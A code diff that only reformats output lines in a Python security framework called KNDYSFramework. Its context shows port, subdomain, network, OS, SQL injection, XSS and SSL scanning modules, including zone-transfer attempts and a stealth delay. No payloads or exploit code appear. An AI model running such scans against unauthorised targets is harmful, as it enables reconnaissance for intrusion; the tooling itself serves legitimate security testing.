-                        print(f"{Fore.BLUE}  └─ Version: {banner_info['version'][:60]}{Style.RESET_ALL}")
+                        print(f"{Fore.BLUE} └─ Version: {banner_info['version'][:60]}{Style.RESET_ALL}")
                     elif banner_info.get('service'):
-                        print(f"{Fore.BLUE}  └─ Service: {banner_info['service'][:60]}{Style.RESET_ALL}")
+                        print(f"{Fore.BLUE} └─ Service: {banner_info['service'][:60]}{Style.RESET_ALL}")
                     
                     if vulns:
                         vulnerabilities.extend(vulns)
                         for vuln in vulns:
                             severity_color = Fore.MAGENTA if vuln['severity'] == 'CRITICAL' else Fore.RED
-                            print(f"{severity_color}  ⚠ {vuln['type']}: {vuln['description']}{Style.RESET_ALL}")
+                            print(f"{severity_color} {vuln['type']}: {vuln['description']}{Style.RESET_ALL}")
         
         elapsed_time = time.time() - start_time
         
@@ -5516,7 +5516,7 @@ class KNDYSFramework:
             
             for service, ports_list in sorted(services_grouped.items()):
                 ports_str = ', '.join(map(str, ports_list))
-                print(f"{Fore.CYAN}  {service:20s} {Fore.WHITE}→ Ports: {ports_str}{Style.RESET_ALL}")
+                print(f"{Fore.CYAN} {service:20s} {Fore.WHITE}→ Ports: {ports_str}{Style.RESET_ALL}")
             
             # Export results
             self._export_port_scan_results(target, scan_results, elapsed_time)
@@ -5626,12 +5626,12 @@ class KNDYSFramework:
                 if data['vulnerabilities']:
                     f.write("Vulnerabilities:\n")
                     for vuln in data['vulnerabilities']:
-                        f.write(f"  - [{vuln['severity']}] {vuln['type']}: {vuln['description']}\n")
+                        f.write(f" - [{vuln['severity']}] {vuln['type']}: {vuln['description']}\n")
                 f.write("\n" + "-" * 70 + "\n\n")
         
         print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
     
     def run_subdomain_scanner(self):
         """Professional subdomain enumeration with multiple techniques"""
@@ -5642,12 +5642,12 @@ class KNDYSFramework:
         verify_http = self.module_options.get('verify_http', 'true').lower() == 'true'
         
         print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║      PROFESSIONAL SUBDOMAIN SCANNER - KNDYS      ║{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}║ PROFESSIONAL SUBDOMAIN SCANNER - KNDYS ║{Style.RESET_ALL}")
         print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
         
-        print(f"{Fore.WHITE}Domain:{Style.RESET_ALL}     {Fore.CYAN}{domain}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}Domain:{Style.RESET_ALL} {Fore.CYAN}{domain}{Style.RESET_ALL}")
         print(f"{Fore.WHITE}Techniques:{Style.RESET_ALL} {Fore.CYAN}{techniques}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}Threads:{Style.RESET_ALL}    {Fore.CYAN}{threads}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE}Threads:{Style.RESET_ALL} {Fore.CYAN}{threads}{Style.RESET_ALL}")
         print(f"{Fore.WHITE}HTTP Check:{Style.RESET_ALL} {Fore.CYAN}{verify_http}{Style.RESET_ALL}\n")
         
         start_time = time.time()
@@ -5663,26 +5663,26 @@ class KNDYSFramework:
             print(f"{Fore.BLUE}[1/5] Attempting DNS Zone Transfer (AXFR)...{Style.RESET_ALL}")
             axfr_results = self._try_zone_transfer(domain)
             if axfr_results:
-                print(f"{Fore.GREEN}  [+] Zone transfer successful! Found {len(axfr_results)} records{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} [+] Zone transfer successful! Found {len(axfr_results)} records{Style.RESET_ALL}")
                 for sub, ip in axfr_results.items():
                     if ip != wildcard_ip:
                         found_subdomains[sub] = {'ip': ip, 'source': 'AXFR'}
             else:
-                print(f"{Fore.YELLOW}  [-] Zone transfer not allowed{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW} [-] Zone transfer not allowed{Style.RESET_ALL}")
         
         # Technique 2: Certificate Transparency
         if techniques == 'all' or 'crt' in techniques:
             print(f"\n{Fore.BLUE}[2/5] Searching Certificate Transparency logs...{Style.RESET_ALL}")
             crt_results = self._search_crt_sh(domain)
             if crt_results:
-                print(f"{Fore.GREEN}  [+] Found {len(crt_results)} subdomains from certificates{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} [+] Found {len(crt_results)} subdomains from certificates{Style.RESET_ALL}")
                 for sub in crt_results:
                     if sub not in found_subdomains:
                         try:
                             ip = socket.gethostbyname(sub)
                             if ip != wildcard_ip:
                                 found_subdomains[sub] = {'ip': ip, 'source': 'CRT'}
-                                print(f"{Fore.GREEN}    → {sub} [{ip}]{Style.RESET_ALL}")
+                                print(f"{Fore.GREEN} → {sub} [{ip}]{Style.RESET_ALL}")
                         except:
                             pass
         
@@ -5692,11 +5692,11 @@ class KNDYSFramework:
             
             # Load wordlist
             wordlist = self._get_subdomain_wordlist(wordlist_file)
-            print(f"{Fore.WHITE}  Wordlist size: {len(wordlist)} terms{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Wordlist size: {len(wordlist)} terms{Style.RESET_ALL}")
             
             brute_results = self._dns_brute_force(domain, wordlist, threads, wildcard_ip)
             if brute_results:
-                print(f"{Fore.GREEN}  [+] Brute force found {len(brute_results)} subdomains{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} [+] Brute force found {len(brute_results)} subdomains{Style.RESET_ALL}")
                 for sub, ip in brute_results.items():
                     if sub not in found_subdomains:
                         found_subdomains[sub] = {'ip': ip, 'source': 'BRUTE'}
@@ -5706,7 +5706,7 @@ class KNDYSFramework:
             print(f"\n{Fore.BLUE}[4/5] Testing common patterns...{Style.RESET_ALL}")
             pattern_results = self._test_common_patterns(domain, wildcard_ip)
             if pattern_results:
-                print(f"{Fore.GREEN}  [+] Found {len(pattern_results)} from patterns{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} [+] Found {len(pattern_results)} from patterns{Style.RESET_ALL}")
                 for sub, ip in pattern_results.items():
                     if sub not in found_subdomains:
                         found_subdomains[sub] = {'ip': ip, 'source': 'PATTERN'}
@@ -5732,7 +5732,7 @@ class KNDYSFramework:
             
             print(f"\n{Fore.YELLOW}[*] Results by technique:{Style.RESET_ALL}")
             for source, count in sorted(sources.items()):
-                print(f"{Fore.WHITE}  {source:10s}: {count} subdomains{Style.RESET_ALL}")
+                print(f"{Fore.WHITE} {source:10s}: {count} subdomains{Style.RESET_ALL}")
             
             # Display results
             print(f"\n{Fore.YELLOW}[*] Discovered subdomains:{Style.RESET_ALL}")
@@ -5741,7 +5741,7 @@ class KNDYSFramework:
                 data = found_subdomains[sub]
                 http_status = data.get('http_status', '')
                 status_str = f" [{http_status}]" if http_status else ""
-                print(f"{Fore.GREEN}  {sub:40s} {Fore.CYAN}{data['ip']:15s} {Fore.YELLOW}{status_str}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} {sub:40s} {Fore.CYAN}{data['ip']:15s} {Fore.YELLOW}{status_str}{Style.RESET_ALL}")
             
             # Export results
             self._export_subdomain_results(domain, found_subdomains, elapsed_time)
@@ -5858,7 +5858,7 @@ class KNDYSFramework:
                 if result:
                     subdomain, ip = result
                     results[subdomain] = ip
-                    print(f"{Fore.GREEN}    → {subdomain} [{ip}]{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN} → {subdomain} [{ip}]{Style.RESET_ALL}")
         
         return results
     
@@ -5958,8 +5958,8 @@ class KNDYSFramework:
                 f.write("\n" + "-" * 70 + "\n\n")
         
         print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
     
     def run_web_crawler(self):
         """Advanced web crawler with tech detection and vulnerability analytics"""
@@ -6107,7 +6107,7 @@ class KNDYSFramework:
         if results['vulnerabilities']:
             print(f"{Fore.RED}[!] Vulnerabilities detected: {len(results['vulnerabilities'])}{Style.RESET_ALL}")
             for vuln in results['vulnerabilities'][:5]:
-                print(f"  {Fore.YELLOW}- {vuln['type']} ({vuln['severity']}) on {vuln.get('url', 'unknown')}{Style.RESET_ALL}")
+                print(f" {Fore.YELLOW}- {vuln['type']} ({vuln['severity']}) on {vuln.get('url', 'unknown')}{Style.RESET_ALL}")
         
         print(f"\n{Fore.CYAN}[*] Crawl completed in {elapsed:.2f}s{Style.RESET_ALL}\n")
         self._export_crawler_results(url, results, elapsed)
@@ -6371,27 +6371,27 @@ class KNDYSFramework:
             fh.write(f"Duration: {elapsed:.2f}s\n\n")
             fh.write("Statistics:\n")
             for key, value in data['statistics'].items():
-                fh.write(f"  • {key.replace('_', ' ').title()}: {value}\n")
+                fh.write(f" • {key.replace('_', ' ').title()}: {value}\n")
             if results['technologies']:
                 fh.write("\nTechnologies:\n")
                 for tech in results['technologies']:
-                    fh.write(f"  • {tech}\n")
+                    fh.write(f" • {tech}\n")
             if results['sensitive_files']:
                 fh.write("\nSensitive Files:\n")
                 for item in results['sensitive_files']:
-                    fh.write(f"  • {item}\n")
+                    fh.write(f" • {item}\n")
             if results['vulnerabilities']:
                 fh.write("\nVulnerabilities:\n")
                 for vuln in results['vulnerabilities']:
-                    fh.write(f"  [{vuln['severity']}] {vuln['type']} - {vuln.get('url', 'n/a')}\n")
-                    fh.write(f"     {vuln['description']}\n")
+                    fh.write(f" [{vuln['severity']}] {vuln['type']} - {vuln.get('url', 'n/a')}\n")
+                    fh.write(f" {vuln['description']}\n")
             if results['api_endpoints']:
                 fh.write("\nAPI Endpoints:\n")
                 for endpoint in results['api_endpoints'][:25]:
-                    fh.write(f"  • {endpoint}\n")
+                    fh.write(f" • {endpoint}\n")
         print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
 
     def run_network_mapper(self):
         """Advanced network discovery with OS, service, and topology analysis"""
@@ -6485,18 +6485,18 @@ class KNDYSFramework:
                     latency = result['latency'] if result['latency'] is not None else 0.0
                     os_guess = result['os_guess'] or 'Unknown'
                     device = result['device_type'] or 'Unknown'
-                    print(f"{Fore.GREEN}✓ {result['ip']} ({host_label}) [{latency:.2f}ms] - {os_guess} - {device}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN} {result['ip']} ({host_label}) [{latency:.2f}ms] - {os_guess} - {device}{Style.RESET_ALL}")
                     if result['open_ports']:
                         ports_line = ', '.join(str(port) for port in result['open_ports'])
-                        print(f"  {Fore.CYAN}↳ Open ports: {ports_line}{Style.RESET_ALL}")
+                        print(f" {Fore.CYAN}↳ Open ports: {ports_line}{Style.RESET_ALL}")
                     if result.get('udp_ports'):
                         ports_line = ', '.join(f"{p}/udp" for p in result['udp_ports'])
-                        print(f"  {Fore.CYAN}↳ UDP services: {ports_line}{Style.RESET_ALL}")
+                        print(f" {Fore.CYAN}↳ UDP services: {ports_line}{Style.RESET_ALL}")
                     if result['services']:
                         for port_key, svc in sorted(result['services'].items(), key=lambda item: item[0]):
                             banner = svc.get('banner', '')
                             detail = f" - {banner[:80]}" if banner else ''
-                            print(f"    {Fore.YELLOW}• {port_key}/{svc.get('name', 'Service')}{detail}{Style.RESET_ALL}")
+                            print(f" {Fore.YELLOW}• {port_key}/{svc.get('name', 'Service')}{detail}{Style.RESET_ALL}")
                 if scanned_hosts % 25 == 0:
                     print(f"{Fore.BLUE}[*] Progress: {scanned_hosts}/{total_hosts} hosts, {live_hosts} live{Style.RESET_ALL}", end='\r')
 
@@ -6520,18 +6520,18 @@ class KNDYSFramework:
                 os_guess = info['os_guess'] or 'Unknown'
                 device = info['device_type'] or 'Unknown'
                 latency = info['latency'] if info['latency'] is not None else 0.0
-                print(f"{Fore.GREEN}✓ {ip} ({host_label}) [{latency:.2f}ms] - {os_guess} - {device}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN} {ip} ({host_label}) [{latency:.2f}ms] - {os_guess} - {device}{Style.RESET_ALL}")
                 if info['open_ports']:
                     ports_line = ', '.join(str(port) for port in info['open_ports'])
-                    print(f"  {Fore.CYAN}↳ Open ports: {ports_line}{Style.RESET_ALL}")
+                    print(f" {Fore.CYAN}↳ Open ports: {ports_line}{Style.RESET_ALL}")
                 if info.get('udp_ports'):
                     ports_line = ', '.join(f"{p}/udp" for p in info['udp_ports'])
-                    print(f"  {Fore.CYAN}↳ UDP services: {ports_line}{Style.RESET_ALL}")
+                    print(f" {Fore.CYAN}↳ UDP services: {ports_line}{Style.RESET_ALL}")
                 if info['services']:
                     for port_key, svc in sorted(info['services'].items(), key=lambda item: item[0]):
                         banner = svc.get('banner', '')
                         detail = f" - {banner[:80]}" if banner else ''
-                        print(f"    {Fore.YELLOW}• {port_key}/{svc.get('name', 'Service')}{detail}{Style.RESET_ALL}")
+                        print(f" {Fore.YELLOW}• {port_key}/{svc.get('name', 'Service')}{detail}{Style.RESET_ALL}")
 
         network_info = {
             'network': str(net),
@@ -6714,7 +6714,7 @@ class KNDYSFramework:
                 request = f"HEAD / HTTP/1.0\r\nHost: {ip}\r\nUser-Agent: {self.config['user_agent']}\r\nConnection: close\r\n\r\n"
                 sock.sendall(request.encode())
             elif port in {25, 110, 143, 465, 587, 993, 995}:
-                pass  # banners usually sent automatically
+                pass # banners usually sent automatically
             elif port == 21:
                 pass
             elif port == 22:
@@ -6869,7 +6869,7 @@ class KNDYSFramework:
             fh.write("Network Information:\n")
             fh.write("-" * 78 + "\n")
             for key, value in network_info.items():
-                fh.write(f"  {key}: {value}\n")
+                fh.write(f" {key}: {value}\n")
             fh.write("\n")
 
             fh.write(f"Live Hosts ({statistics['live_hosts_found']}):\n")
@@ -6878,22 +6878,22 @@ class KNDYSFramework:
                 info = hosts[ip]
                 fh.write(f"IP: {ip}\n")
                 if info['hostnames']:
-                    fh.write(f"  Hostname: {info['hostnames'][0]}\n")
-                fh.write(f"  Latency: {info['latency']:.2f}ms\n" if info['latency'] else "  Latency: n/a\n")
-                fh.write(f"  OS: {info.get('os_guess', 'Unknown')}\n")
-                fh.write(f"  Device Type: {info.get('device_type', 'Unknown')} (Confidence: {info.get('device_confidence', 'Low')})\n")
+                    fh.write(f" Hostname: {info['hostnames'][0]}\n")
+                fh.write(f" Latency: {info['latency']:.2f}ms\n" if info['latency'] else " Latency: n/a\n")
+                fh.write(f" OS: {info.get('os_guess', 'Unknown')}\n")
+                fh.write(f" Device Type: {info.get('device_type', 'Unknown')} (Confidence: {info.get('device_confidence', 'Low')})\n")
                 if info['open_ports']:
-                    fh.write(f"  Open Ports: {', '.join(str(p) for p in info['open_ports'])}\n")
+                    fh.write(f" Open Ports: {', '.join(str(p) for p in info['open_ports'])}\n")
                 if info.get('udp_ports'):
-                    fh.write(f"  UDP Services: {', '.join(f'{p}/udp' for p in info['udp_ports'])}\n")
+                    fh.write(f" UDP Services: {', '.join(f'{p}/udp' for p in info['udp_ports'])}\n")
                 if info['services']:
-                    fh.write("  Services:\n")
+                    fh.write(" Services:\n")
                     for port_key, svc in sorted(info['services'].items(), key=lambda item: item[0]):
                         banner = svc.get('banner') or ''
                         if banner:
-                            fh.write(f"    - {port_key}/{svc.get('name', 'Service')}: {banner[:100]}\n")
+                            fh.write(f" - {port_key}/{svc.get('name', 'Service')}: {banner[:100]}\n")
                         else:
-                            fh.write(f"    - {port_key}/{svc.get('name', 'Service')}\n")
+                            fh.write(f" - {port_key}/{svc.get('name', 'Service')}\n")
                 fh.write("\n")
 
             if topology:
@@ -6902,17 +6902,17 @@ class KNDYSFramework:
                 fh.write(f"Potential Gateways: {', '.join(topology.get('potential_gateways', [])) or 'None'}\n")
                 fh.write("\nDevice Groups:\n")
                 for device, members in topology.get('device_groups', {}).items():
-                    fh.write(f"  {device}: {len(members)} hosts\n")
+                    fh.write(f" {device}: {len(members)} hosts\n")
                 fh.write("\nOS Distribution:\n")
                 for os_name, count in topology.get('os_distribution', {}).items():
-                    fh.write(f"  {os_name}: {count}\n")
+                    fh.write(f" {os_name}: {count}\n")
                 fh.write("\nService Distribution:\n")
                 for svc_name, count in topology.get('service_distribution', {}).items():
-                    fh.write(f"  {svc_name}: {count}\n")
+                    fh.write(f" {svc_name}: {count}\n")
 
         print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
     
     def run_os_detection(self):
         """Advanced multi-factor OS detection with fingerprint scoring"""
@@ -7006,7 +7006,7 @@ class KNDYSFramework:
             color = Fore.GREEN if idx == 1 else Fore.YELLOW
             print(f"{color}{idx}. {match['os']:<28} {bar} {match['confidence']}%{Style.RESET_ALL}")
             for evidence in match['evidence'][:2]:
-                print(f"    - {evidence}")
+                print(f" - {evidence}")
         if not os_matches:
             print(f"{Fore.YELLOW}[!] Unable to determine OS with confidence{Style.RESET_ALL}")
 
@@ -7015,7 +7015,7 @@ class KNDYSFramework:
             for entry in port_results:
                 banner = entry.get('banner', '')
                 preview = f" - {banner[:80]}" if banner else ''
-                print(f"  {Fore.GREEN}• {entry['port']}/{entry['service']}{preview}{Style.RESET_ALL}")
+                print(f" {Fore.GREEN}• {entry['port']}/{entry['service']}{preview}{Style.RESET_ALL}")
 
         print(f"\n{Fore.CYAN}[*] Scan completed in {elapsed:.2f}s{Style.RESET_ALL}\n")
 
@@ -7372,42 +7372,42 @@ class KNDYSFramework:
             fh.write("\nOS Detection Results:\n")
             fh.write("-" * 78 + "\n")
             for match in scan_data['os_matches'][:5]:
-                fh.write(f"  - {match['os']}: {match['confidence']}% confidence\n")
+                fh.write(f" - {match['os']}: {match['confidence']}% confidence\n")
                 for evidence in match['evidence'][:3]:
-                    fh.write(f"      * {evidence}\n")
+                    fh.write(f" * {evidence}\n")
             fh.write("\n")
             icmp = scan_data['fingerprints'].get('icmp') or {}
             if icmp:
                 fh.write("ICMP Fingerprint:\n")
                 fh.write("-" * 78 + "\n")
-                fh.write(f"  Method: {icmp.get('method', 'n/a')}\n")
-                fh.write(f"  TTL: {icmp.get('ttl', 'n/a')}\n")
-                fh.write(f"  Response Time: {icmp.get('response_time', 'n/a')} ms\n\n")
+                fh.write(f" Method: {icmp.get('method', 'n/a')}\n")
+                fh.write(f" TTL: {icmp.get('ttl', 'n/a')}\n")
+                fh.write(f" Response Time: {icmp.get('response_time', 'n/a')} ms\n\n")
             if scan_data['open_ports']:
                 fh.write(f"Open Ports ({len(scan_data['open_ports'])}):\n")
                 fh.write("-" * 78 + "\n")
-                fh.write(f"  {', '.join(str(p) for p in scan_data['open_ports'])}\n\n")
+                fh.write(f" {', '.join(str(p) for p in scan_data['open_ports'])}\n\n")
                 fh.write("Service Analysis:\n")
                 fh.write("-" * 78 + "\n")
                 for entry in scan_data['ports']:
-                    fh.write(f"  Port {entry['port']}/{entry['service']}\n")
+                    fh.write(f" Port {entry['port']}/{entry['service']}\n")
                     if entry.get('banner'):
-                        fh.write(f"    Banner: {entry['banner'][:120]}\n")
+                        fh.write(f" Banner: {entry['banner'][:120]}\n")
                 fh.write("\n")
             if scan_data['fingerprints'].get('http'):
                 fh.write("HTTP Header Insights:\n")
                 fh.write("-" * 78 + "\n")
                 for insight in scan_data['fingerprints']['http']:
-                    fh.write(f"  Port {insight['port']} ({insight['url']}):\n")
-                    fh.write(f"    Server: {insight.get('server', 'n/a')}\n")
-                    fh.write(f"    X-Powered-By: {insight.get('powered_by', 'n/a')}\n")
+                    fh.write(f" Port {insight['port']} ({insight['url']}):\n")
+                    fh.write(f" Server: {insight.get('server', 'n/a')}\n")
+                    fh.write(f" X-Powered-By: {insight.get('powered_by', 'n/a')}\n")
                     if insight.get('os_guess'):
-                        fh.write(f"    OS Indication: {insight['os_guess']}\n")
+                        fh.write(f" OS Indication: {insight['os_guess']}\n")
                 fh.write("\n")
 
         print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
     
     # ============ SCAN MODULES ============
     
@@ -7516,9 +7516,9 @@ class KNDYSFramework:
                         })
                         severity_color = self._get_severity_color(severity)
                         print(f"{severity_color}[+] {severity.upper()}: {check_name}{Style.RESET_ALL}")
-                        print(f"{Fore.WHITE}    └─ {details}{Style.RESET_ALL}")
+                        print(f"{Fore.WHITE} └─ {details}{Style.RESET_ALL}")
                         if stealth:
-                            time.sleep(1)  # Delay for stealth mode
+                            time.sleep(1) # Delay for stealth mode
                 except Exception as e:
                     if aggressive:
                         print(f"{Fore.RED}[-] Error in {check_name}: {str(e)}{Style.RESET_ALL}")
@@ -7540,15 +7540,15 @@ class KNDYSFramework:
             print(f"{Fore.RED}[!] Found {len(vulnerabilities)} vulnerabilities{Style.RESET_ALL}\n")
             print(f"{Fore.WHITE}Risk Distribution:{Style.RESET_ALL}")
             if critical > 0:
-                print(f"  {Fore.RED}● Critical: {critical}{Style.RESET_ALL}")
+                print(f" {Fore.RED}● Critical: {critical}{Style.RESET_ALL}")
             if high > 0:
-                print(f"  {Fore.LIGHTRED_EX}● High: {high}{Style.RESET_ALL}")
+                print(f" {Fore.LIGHTRED_EX}● High: {high}{Style.RESET_ALL}")
             if medium > 0:
-                print(f"  {Fore.YELLOW}● Medium: {medium}{Style.RESET_ALL}")
+                print(f" {Fore.YELLOW}● Medium: {medium}{Style.RESET_ALL}")
             if low > 0:
-                print(f"  {Fore.LIGHTYELLOW_EX}● Low: {low}{Style.RESET_ALL}")
+                print(f" {Fore.LIGHTYELLOW_EX}● Low: {low}{Style.RESET_ALL}")
             if info > 0:
-                print(f"  {Fore.CYAN}● Info: {info}{Style.RESET_ALL}")
+                print(f" {Fore.CYAN}● Info: {info}{Style.RESET_ALL}")
         else:
             print(f"{Fore.GREEN}[+] No vulnerabilities detected{Style.RESET_ALL}")
         
@@ -7615,7 +7615,7 @@ class KNDYSFramework:
             for severity in ['Critical', 'High', 'Medium', 'Low', 'Info']:
                 count = sum(1 for v in vulnerabilities if v['severity'] == severity)
                 if count > 0:
-                    f.write(f"  {severity}: {count}\n")
+                    f.write(f" {severity}: {count}\n")
             f.write("\n" + "=" * 70 + "\n\n")
             
             # Group by category
@@ -7637,8 +7637,8 @@ class KNDYSFramework:
                 f.write("\n")
         
         print(f"\n{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
     
     # ============ 33 CHECK FUNCTIONS ============
     
@@ -8366,7 +8366,7 @@ class KNDYSFramework:
         if results:
             print(f"{Fore.GREEN}[+] Found {len(results)} SQL injection vulnerabilities{Style.RESET_ALL}")
             for vuln_type, details in results:
-                print(f"  {vuln_type}: {details}")
+                print(f" {vuln_type}: {details}")
         else:
             print(f"{Fore.YELLOW}[*] No SQL injection vulnerabilities found{Style.RESET_ALL}")
     
@@ -8519,9 +8519,9 @@ class KNDYSFramework:
 
         print(f"{Fore.CYAN}[*] Surface summary: {discovery['stats']['pages']} page(s), {discovery['stats']['forms']} form(s), {len(injection_points)} injection point(s){Style.RESET_ALL}")
         for preview in injection_points[:5]:
-            print(f"  {Fore.GREEN}• {preview['method']} {preview['param']} @ {preview['url']}{Style.RESET_ALL}")
+            print(f" {Fore.GREEN}• {preview['method']} {preview['param']} @ {preview['url']}{Style.RESET_ALL}")
         if len(injection_points) > 5:
-            print(f"  ... ({len(injection_points) - 5} more)")
+            print(f" ... ({len(injection_points) - 5} more)")
 
         payload_bank = self._build_xss_payload_bank(opts)
         print(f"\n{Fore.BLUE}[*] Phase 2: Payload matrix ({len(payload_bank)} curated payloads){Style.RESET_ALL}")
@@ -8552,20 +8552,20 @@ class KNDYSFramework:
         if summary['vulnerabilities']:
             for idx, vuln in enumerate(summary['vulnerabilities'], 1):
                 print(f"{Fore.GREEN}{idx}. {vuln['type']} via {vuln['method']} parameter '{vuln['parameter']}' ({vuln['endpoint']}){Style.RESET_ALL}")
-                print(f"    Payload: {vuln['payload'][:120]}")
+                print(f" Payload: {vuln['payload'][:120]}")
                 if vuln.get('evidence'):
-                    print(f"    Evidence: {vuln['evidence'][:140]}")
+                    print(f" Evidence: {vuln['evidence'][:140]}")
         else:
             print(f"{Fore.YELLOW}[*] No direct reflected payload execution confirmed{Style.RESET_ALL}")
 
         if dom_findings:
             print(f"\n{Fore.CYAN}DOM Findings: {len(dom_findings)}{Style.RESET_ALL}")
             for finding in dom_findings[:5]:
-                print(f"  - {finding['severity']} risk sink at {finding['url']} ({finding['pattern']})")
+                print(f" - {finding['severity']} risk sink at {finding['url']} ({finding['pattern']})")
         if stored_findings:
             print(f"\n{Fore.CYAN}Stored Findings: {len(stored_findings)}{Style.RESET_ALL}")
             for finding in stored_findings:
-                print(f"  - {finding['method']} parameter '{finding['parameter']}' persists payload ({finding['verification_url']})")
+                print(f" - {finding['method']} parameter '{finding['parameter']}' persists payload ({finding['verification_url']})")
 
         print(f"\n{Fore.CYAN}[*] Requests: {results['requests']} | WAF events: {len(results['waf_events'])} | Errors: {len(results['errors'])}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}[*] Scan completed in {summary['duration']:.2f}s{Style.RESET_ALL}")
@@ -9409,50 +9409,50 @@ class KNDYSFramework:
             fh.write("Statistics:\n")
             fh.write("-" * 78 + "\n")
             for key, value in summary['stats'].items():
-                fh.write(f"  {key.replace('_', ' ').title()}: {value}\n")
+                fh.write(f" {key.replace('_', ' ').title()}: {value}\n")
             fh.write("\nVulnerabilities:\n")
             fh.write("-" * 78 + "\n")
             if summary['vulnerabilities']:
                 for vuln in summary['vulnerabilities']:
-                    fh.write(f"  - {vuln['type']} via {vuln['method']} parameter '{vuln['parameter']}'\n")
-                    fh.write(f"    Payload: {vuln['payload']}\n")
+                    fh.write(f" - {vuln['type']} via {vuln['method']} parameter '{vuln['parameter']}'\n")
+                    fh.write(f" Payload: {vuln['payload']}\n")
                     if vuln.get('evidence'):
-                        fh.write(f"    Evidence: {vuln['evidence']}\n")
+                        fh.write(f" Evidence: {vuln['evidence']}\n")
             else:
-                fh.write("  None detected\n")
+                fh.write(" None detected\n")
             fh.write("\nDOM Findings:\n")
             fh.write("-" * 78 + "\n")
             if summary['dom_findings']:
                 for finding in summary['dom_findings']:
-                    fh.write(f"  - {finding['severity']} risk at {finding['url']} ({finding['pattern']})\n")
+                    fh.write(f" - {finding['severity']} risk at {finding['url']} ({finding['pattern']})\n")
             else:
-                fh.write("  None\n")
+                fh.write(" None\n")
             fh.write("\nStored Findings:\n")
             fh.write("-" * 78 + "\n")
             if summary['stored_findings']:
                 for finding in summary['stored_findings']:
-                    fh.write(f"  - {finding['method']} parameter '{finding['parameter']}' persisted payload\n")
-                    fh.write(f"    Evidence: {finding['evidence']}\n")
+                    fh.write(f" - {finding['method']} parameter '{finding['parameter']}' persisted payload\n")
+                    fh.write(f" Evidence: {finding['evidence']}\n")
             else:
-                fh.write("  None\n")
+                fh.write(" None\n")
             if summary['observations']:
                 fh.write("\nReflections/Observations:\n")
                 fh.write("-" * 78 + "\n")
                 for obs in summary['observations']:
-                    fh.write(f"  - {obs['parameter']} @ {obs['endpoint']}: {obs['detail']}\n")
+                    fh.write(f" - {obs['parameter']} @ {obs['endpoint']}: {obs['detail']}\n")
             if summary['waf_events']:
                 fh.write("\nWAF Events:\n")
                 fh.write("-" * 78 + "\n")
                 for event in summary['waf_events']:
-                    fh.write(f"  - {event['url']} returned status {event['status']}\n")
+                    fh.write(f" - {event['url']} returned status {event['status']}\n")
             if summary['errors']:
                 fh.write("\nErrors:\n")
                 fh.write("-" * 78 + "\n")
                 for err in summary['errors']:
-                    fh.write(f"  - {err}\n")
+                    fh.write(f" - {err}\n")
         print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
-        print(f"  • {json_file}")
-        print(f"  • {txt_file}")
+        print(f" • {json_file}")
+        print(f" • {txt_file}")
     
     def run_ssl_scanner(self):
         """Adaptive SSL/TLS analyzer with protocol, cipher, and policy checks"""
@@ -9816,14 +9816,14 @@ class KNDYSFramework:
         cert = summary['certificate']
         print(f"{Fore.CYAN}[*] Certificate: {cert.get('subject', 'n/a')}{Style.RESET_ALL}")
         if cert.get('not_after'):
-            print(f"{Fore.CYAN}    Valid Until: {cert['not_after']} ({cert.get('days_remaining')} days remaining){Style.RESET_ALL}")
+            print(f"{Fore.CYAN} Valid Until: {cert['not_after']} ({cert.get('days_remaining')} days remaining){Style.RESET_ALL}")
         cipher = summary['baseline'].get('cipher')
         if cipher:
             print(f"{Fore.CYAN}[*] Current Cipher: {cipher.get('name')} ({cipher.get('bits')} bit){Style.RESET_ALL}")
         if summary['issues']:
             print(f"\n{Fore.RED}[!] Findings ({len(summary['issues'])}){Style.RESET_ALL}")
             for issue in summary['issues'][:5]:
-                print(f"  - {issue['severity']}: {issue['detail']}")
+                print(f" - {issue['severity']}: {issue['detail']}")
         else:
             print(f"\n{Fore.GREEN}[+] No critical SSL/TLS weaknesses detected{Style.RESET_ALL}")
 
@@ -9844,35 +9844,35 @@ class KNDYSFramework:
             fh.write("-" * 78 + "\n")
             cert = summary['certificate']
             for key in ['subject', 'issuer', 'not_before', 'not_after', 'key_type', 'key_size', 'signature_algorithm']:
-                fh.write(f"  {key.replace('_', ' ').title()}: {cert.get(key, 'n/a')}\n")
+                fh.write(f" {key.replace('_', ' ').title()}: {cert.get(key, 'n/a')}\n")
             if cert.get('san'):
-                fh.write(f"  SAN: {', '.join(cert['san'][:10])}\n")
+                fh.write(f" SAN: {', '.join(cert['san'][:10])}\n")
